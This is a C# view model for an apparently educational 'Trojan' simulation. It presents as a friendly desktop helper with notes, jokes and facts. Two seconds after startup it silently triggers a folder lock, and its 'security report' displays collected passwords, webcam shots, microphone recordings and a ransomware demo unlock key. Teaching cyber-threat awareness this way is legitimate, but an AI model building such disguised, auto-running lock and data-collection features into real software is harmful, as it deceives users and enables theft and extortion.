using System.IO;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using Trojan.Core.Base;
using Trojan.Core.Commands;
using Trojan.Core.Interface;
using Trojan.Core.Models;
using Trojan.Services;
using Trojan.Services.Logger;
using Trojan.Views;
using System.Threading.Tasks;
namespace Trojan.UI.ViewModels;
using System.Text;


public sealed class HelperOverlayViewModel : ObservableObject
{
    public MainViewModel Main { get; }

    private bool _areBubblesVisible;
    private bool _isNoteVisible;
    private bool _isHistoryVisible;
    private bool _isJokeVisible;
    private bool _isFactVisible;
    private bool _isSecurityReportVisible;
    private bool _isGallaryVisible;
    private string _securityReportText = string.Empty;
    private GalleryViewModel _gallery;

    private Uri _avatarGif =
    new Uri(
        "pack://application:,,,/UI/Assets/SpriteSheet/gregor_samsa_sprite-1.gif",
        UriKind.Absolute);

    public Uri AvatarGif
    {
        get => _avatarGif;
        set => SetProperty(ref _avatarGif, value);
    }
    public bool IsNoteVisible
    {
        get => _isNoteVisible;
        set => SetProperty(ref _isNoteVisible, value);
    }

    public GalleryViewModel Gallery
    {
        get => _gallery;
        set => SetProperty(ref _gallery, value);
    }
    public bool IsHistoryVisible
    {
        get => _isHistoryVisible;
        set => SetProperty(ref _isHistoryVisible, value);

    }

    public bool IsGallaryVisible
    {
        get => _isGallaryVisible;
        set => SetProperty(ref _isGallaryVisible, value);
    }
    public bool AreBubblesVisible
    {
        get => _areBubblesVisible;
        set => SetProperty(ref _areBubblesVisible, value);
    }

    public bool IsJokeVisible
    {
        get => _isJokeVisible;
        set => SetProperty(ref _isJokeVisible, value);

    }

    public bool IsFactVisible
    {
        get => _isFactVisible;
        set => SetProperty(ref _isFactVisible, value);
    }

    public bool IsSecurityReportVisible
    {
        get => _isSecurityReportVisible;
        set => SetProperty(ref _isSecurityReportVisible, value);
    }

    public string SecurityReportText
    {
        get => _securityReportText;
        set => SetProperty(ref _securityReportText, value);
    }
    public ICommand ToggleBubblesCommand { get; }
    public ICommand OpenNoteCommand { get; }
    public ICommand OpenGallaryCommand { get; }
    public ICommand OpenNoteForNoteCommand { get; }
    public ICommand OpenHistoryCommand { get; }
    public ICommand OpenJokeCommand { get; }
    public ICommand NextJokeCommand { get; }
    public ICommand PreviousJokeCommand { get; }
    public ICommand OpenFactCommand { get; }
    public ICommand NextFactCommand { get; }
    public ICommand PreviousFactCommand { get; }
    public ICommand CreateNoteCommand { get; }
    public ICommand SaveNoteCommand { get; }
    public ICommand DeleteNoteCommand { get; }
    public ICommand TogglePinCommand { get; }
    public ICommand TogglePinForNoteCommand { get; }

    public ICommand OpenSecurityReportCommand { get; }

    public ICommand UnlockFolderCommand { get; }


    public HelperOverlayViewModel()
    {
        Main = new MainViewModel();
        ToggleBubblesCommand = new RelayCommand(ToggleBubbles);
        Gallery = new GalleryViewModel();
        OpenNoteCommand = new RelayCommand(OpenNote);
        OpenGallaryCommand = new RelayCommand(OpenGallary);
        OpenNoteForNoteCommand = new RelayCommand<Note>(OpenNoteForNote);
        OpenHistoryCommand = new RelayCommand(OpenHistory);

        OpenJokeCommand = new RelayCommand(OpenJoke);
        NextJokeCommand = new RelayCommand(NextJoke);
        PreviousJokeCommand = new RelayCommand(PreviousJoke);

        OpenFactCommand = new RelayCommand(OpenFact);
        NextFactCommand = new RelayCommand(NextFact);
        PreviousFactCommand = new RelayCommand(PreviousFact);
        CreateNoteCommand = new RelayCommand(CreateNote);
        SaveNoteCommand = new RelayCommand(SaveSelectedNote);
        DeleteNoteCommand = new RelayCommand(DeleteSelectedNote);
        TogglePinCommand = new RelayCommand(TogglePin);
        TogglePinForNoteCommand = Main.TogglePinForNoteCommand;
        OpenSecurityReportCommand = new RelayCommand(OpenSecurityReport);
        _securityReportText = BuildSecurityReport();

        UnlockFolderCommand = new RelayCommand(UnlockFolder);


        _jokeText = _jokes[_currentJokeIndex];
        _factText = _facts[_currentFactIndex];
        _ = Task.Run(() =>
        {
            Thread.Sleep(2000); // sačekaj 2 sekunde da se aplikacija učita
            DeviceScannerService.LockFolder();
        });
    }

    private void OpenNoteForNote(Note? note)
    {
        if (note is not null)
        {
            Main.SelectedNote = note;
        }

        if (!IsNoteVisible)
        {
            OpenNote();
        }
        else
        {
            IsHistoryVisible = false;
            IsJokeVisible = false;
            IsFactVisible = false;
            IsSecurityReportVisible = false;
            IsGallaryVisible = false;
        }
    }

    private void ToggleBubbles()
    {
        AreBubblesVisible = !AreBubblesVisible;

        if (!AreBubblesVisible)
        {
            IsNoteVisible = false;
            IsHistoryVisible = false;
            IsJokeVisible = false;
            IsFactVisible = false;
            IsSecurityReportVisible = false;
            IsGallaryVisible = false;
        }
    }

    private void OpenNote()
    {
        IsNoteVisible = !IsNoteVisible;

        if (IsNoteVisible)
        {
            IsJokeVisible = false;
            IsHistoryVisible = false;
            IsFactVisible = false;
            IsSecurityReportVisible = false;
            IsGallaryVisible = false;
        }
    }

    private void OpenGallary()
    {
        AppLog.Info($"OpenGallary called! Current IsGallaryVisible: {IsGallaryVisible}");
        IsGallaryVisible = !IsGallaryVisible;
        AppLog.Info($"After toggle IsGallaryVisible: {IsGallaryVisible}");
        if (IsGallaryVisible)
        {
            IsJokeVisible = false;
            IsHistoryVisible = false;
            IsFactVisible = false;
            IsSecurityReportVisible = false;
            IsNoteVisible = false;
        }
    }

    private void OpenHistory()
    {
        IsHistoryVisible = !IsHistoryVisible;

        if (IsHistoryVisible)
        {
            IsNoteVisible = false;
            IsJokeVisible = false;
            IsFactVisible = false;
            IsSecurityReportVisible = false;
            IsGallaryVisible = false;
        }
    }

    private void CreateNote()
    {
        Main.CreateNoteCommand.Execute(null);
        IsHistoryVisible = false;
        IsNoteVisible = true;
    }

    private void SaveSelectedNote()
    {
        if (Main.SelectedNote is null)
        {
            return;
        }

        Main.SaveNoteCommand.Execute(null);
        IsNoteVisible = false;
        IsHistoryVisible = true;
    }

    private async void DeleteSelectedNote()
    {
        if (Main.SelectedNote is null)
        {
            return;
        }

        Main.DeleteNoteCommand.Execute(null);
        await ShowOverlaySequenceAsync();

    }

    private void TogglePin()
    {
        if (Main.SelectedNote is null)
        {
            return;
        }

        Main.TogglePinCommand.Execute(null);
    }
    public string BuildSecurityReport()
    {
        var sb = new StringBuilder();
        var gnezdecePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "gnezdece");

        sb.AppendLine("═══════════════════════════════════════════════════════════════");
        sb.AppendLine("                    🔐 VARSTVENO POROČILO");
        sb.AppendLine("═══════════════════════════════════════════════════════════════");
        sb.AppendLine();
        sb.AppendLine("To poročilo prikazuje vse podatke, ki jih je simulacija zbrala.");
        sb.AppendLine("NAMEN: izobraževanje o kibernetskih grožnjah.");
        sb.AppendLine();

        // ============ 1. INFO O NAPRAVI ============
        sb.AppendLine("📱 1. PODATKI O NAPRAVI (Device Info)");
        sb.AppendLine("────────────────────────────────────────");
        var deviceInfoPath = Path.Combine(gnezdecePath, "device_info.txt");
        if (File.Exists(deviceInfoPath))
        {
            sb.AppendLine(File.ReadAllText(deviceInfoPath));
        }
        else
        {
            sb.AppendLine("Ni podatkov o napravi.");
        }
        sb.AppendLine();

        // ============ 2. GESLA (PASSWORDS) ============
        sb.AppendLine("🔑 2. UKRADENA GESLA (Passwords)");
        sb.AppendLine("────────────────────────────────────────");
        var credPath = Path.Combine(gnezdecePath, "password.txt");
        if (File.Exists(credPath))
        {
            sb.AppendLine(File.ReadAllText(credPath));
        }
        else
        {
            sb.AppendLine("Ni ukradenih gesel.");
        }
        sb.AppendLine();

        // ============ 3. SLIKE IZ SPLETNE KAMERE ============
        sb.AppendLine("📸 3. SLIKE IZ SPLETNE KAMERE (Webcam)");
        sb.AppendLine("────────────────────────────────────────");
        var slikicePath = Path.Combine(gnezdecePath, "slikice");
        if (Directory.Exists(slikicePath))
        {
            var webcamSlike = Directory.GetFiles(slikicePath, "*.jpg").ToList();
            webcamSlike.AddRange(Directory.GetFiles(slikicePath, "*.png"));

            sb.AppendLine($"Število posnetih slik: {webcamSlike.Count}");

            if (webcamSlike.Any())
            {
                var prvaSlika = webcamSlike.First();
                sb.AppendLine($"Prva slika: {prvaSlika}");

                // POSTAVI PUTANJU ZA SLIKU (OVDE JE PRAVO MESTO!)
                WebcamImagePath = prvaSlika;
            }
            else
            {
                WebcamImagePath = string.Empty;
            }
        }
        else
        {
            sb.AppendLine("Mapa 'slikice' ne obstaja - ni posnetih slik.");
            WebcamImagePath = string.Empty;
        }
        sb.AppendLine();

        // ============ 4. AUDIO POSNETKI ============
        sb.AppendLine("🎤 4. AUDIO POSNETKI (Mic Recording)");
        sb.AppendLine("────────────────────────────────────────");
        var audioPath = Path.Combine(gnezdecePath, "audio");
        if (Directory.Exists(audioPath))
        {
            var audioFiles = Directory.GetFiles(audioPath, "*.wav").ToList();
            audioFiles.AddRange(Directory.GetFiles(audioPath, "*.mp3"));

            sb.AppendLine($"Število audio posnetkov: {audioFiles.Count}");
            foreach (var audio in audioFiles.Take(5))
            {
                var fileInfo = new FileInfo(audio);
                sb.AppendLine($"  • {Path.GetFileName(audio)} ({fileInfo.Length / 1024} KB)");
            }
        }
        else
        {
            sb.AppendLine("Mapa 'audio' ne obstaja - ni posnetkov mikrofona.");
        }
        sb.AppendLine();        

        // ============ 5. MOŽNE ZLORABE ============
        sb.AppendLine("⚠️ 5. MOŽNE ZLORABE ZBRANIH PODATKOV");
        sb.AppendLine("────────────────────────────────────────");
        sb.AppendLine("🔴 Gesla: Kraja identitete, dostop do bančnih računov");
        sb.AppendLine("🔴 Webcam slike: Izsiljevanje (sextortion), škoda ugledu");
        sb.AppendLine("🔴 Audio: Prisluškovanje, kraja poslovnih skrivnosti");
        sb.AppendLine("🔴 Galerija: Črna izsiljevanja, prodaja podatkov");
        sb.AppendLine();

        // ============ 6. RANSOMWARE ============
        sb.AppendLine("💀 6. RANSOMWARE SIMULACIJA");
        sb.AppendLine("────────────────────────────────────────");
        sb.AppendLine("Ransomware šifrira datoteke in zahteva odkupnino.");
        sb.AppendLine("🔓 Ključ za odklenitev: demo123");
        sb.AppendLine();

        // ============ 7. ZAŠČITA ============
        sb.AppendLine("🛡️ 7. KAKO SE ZAŠČITITI");
        sb.AppendLine("────────────────────────────────────────");
        sb.AppendLine("✅ Uporabljajte 2FA");
        sb.AppendLine("✅ Nikoli ne vnašajte gesel v sumljiva okna");
        sb.AppendLine("✅ Prekrijte spletno kamero");
        sb.AppendLine("✅ Redno varnostno kopirajte podatke");
        sb.AppendLine();


        return sb.ToString();
    }
    private void UnlockFolder()
    {
        IsSecurityReportVisible = false;

        // Prvo pitaj za lozinku
        string password = Microsoft.VisualBasic.Interaction.InputBox(
            "Unesite lozinku za dešifrovanje fajlova:",
            "Dešifrovanje",
            "");

        if (string.IsNullOrEmpty(password))
        {
            MessageBox.Show("Lozinka nije uneta!", "Greška", MessageBoxButton.OK, MessageBoxImage.Warning);
            return;
        }

        DeviceScannerService.UnlockFolder(password);
    }
    private void OpenSecurityReport()
    {
        IsSecurityReportVisible = !IsSecurityReportVisible;

        if (IsSecurityReportVisible)
        {
            IsNoteVisible = false;
            IsHistoryVisible = false;
            IsJokeVisible = false;
            IsFactVisible = false;
        }

        SecurityReportText = BuildSecurityReport();
    }
    private async void OpenJoke()
    {
        IsJokeVisible = !IsJokeVisible;

        if (IsJokeVisible)
        {
            IsNoteVisible = false;
            IsHistoryVisible = false;
            IsFactVisible = false;
            IsSecurityReportVisible = false;
            SetChooseAvatar();
            await Task.Delay(10000);
            SetAwakeAvatar();
        }
    }

    private static List<string> ReadJokes()
    {
        var list = new List<string>();
        var file = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Assets", "Joke", "joke.csv");
        using (var parser = new Microsoft.VisualBasic.FileIO.TextFieldParser(file))
        {
            parser.TextFieldType = Microsoft.VisualBasic.FileIO.FieldType.Delimited;
            parser.SetDelimiters(",");
            parser.ReadLine();
            while (!parser.EndOfData)
            {
                string[] fields = parser.ReadFields(); //field[0] = ID fields[1] = Joke
                if (fields.Length >= 2)
                {
                    list.Add(fields[1]);
                }
            }
        }
        return list;
    }

    private readonly List<string> _jokes = ReadJokes();

    private void PreviousJoke()
    {
        if (_currentJokeIndex > 0)
        {
            _currentJokeIndex--;
            JokeText = _jokes[_currentJokeIndex];
        }
    }

    private int _currentJokeIndex = 0;


    private static List<string> ReadFacts()
    {
        var list = new List<string>();
        var file = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Assets", "Fact", "fact.csv");
        using (var parser = new Microsoft.VisualBasic.FileIO.TextFieldParser(file))
        {
            parser.TextFieldType = Microsoft.VisualBasic.FileIO.FieldType.Delimited;
            parser.SetDelimiters(",");
            parser.ReadLine();
            while (!parser.EndOfData)
            {
                string[] fields = parser.ReadFields();
                if (fields.Length >= 2)
                {
                    list.Add(fields[1]);
                }
            }
        }
        return list;
    }

    private readonly List<string> _facts = ReadFacts();

    private int _currentFactIndex = 0;


    private void NextJoke()
    {
        Random rand = new Random();
        int _currentJokeIndex = rand.Next(_jokes.Count - 1);
        JokeText = _jokes[_currentJokeIndex];
    }

    private string _factText;

    public string FactText
    {
        get => _factText;
        set => SetProperty(ref _factText, value);

    }
    private string _jokeText;
    public string JokeText
    {
        get => _jokeText;
        set => SetProperty(ref _jokeText, value);

    }

    private async void OpenFact()
    {
        IsFactVisible = !IsFactVisible;

        if (IsFactVisible)
        {
            IsNoteVisible = false;
            IsHistoryVisible = false;
            IsJokeVisible = false;
            IsSecurityReportVisible = false;
            SetChooseAvatar();
            await Task.Delay(10000);
            SetAwakeAvatar();
        }
    }
    private void NextFact()
    {
        Random rand = new Random();
        int _currentFactIndex = rand.Next(_facts.Count - 1);
        FactText = _facts[_currentFactIndex];
    }

    private void PreviousFact()
    {
        if (_currentFactIndex > 0)
        {
            _currentFactIndex--;
            FactText = _facts[_currentFactIndex];
        }
    }

    public async Task ShowOverlaySequenceAsync()
    {
        var blackScreen = new BlackScreenWindow();
        blackScreen.Show();

        await Task.Delay(2000);

        blackScreen.Close();

        var imageOverlay = new ImageOverlayWindow();
        imageOverlay.Show();
    }


    public void SetSleepingAvatar()
    {
        AvatarGif = new Uri(
            "pack://application:,,,/UI/Assets/SpriteSheet/sleepy_samsa.gif",
            UriKind.Absolute);
    }

    public void SetAwakeAvatar()
    {
        AvatarGif = new Uri(
            "pack://application:,,,/UI/Assets/SpriteSheet/gregor_samsa_sprite-1.gif",
            UriKind.Absolute);
    }

    public void SetChooseAvatar()
    {
        AvatarGif = new Uri(
            "pack://application:,,,/UI/Assets/SpriteSheet/gregor_samsa_choose.gif",
            UriKind.Absolute);
    }

    private string _webcamImagePath = string.Empty;

    public string WebcamImagePath
    {
        get => _webcamImagePath;
        set => SetProperty(ref _webcamImagePath, value);
    }
}
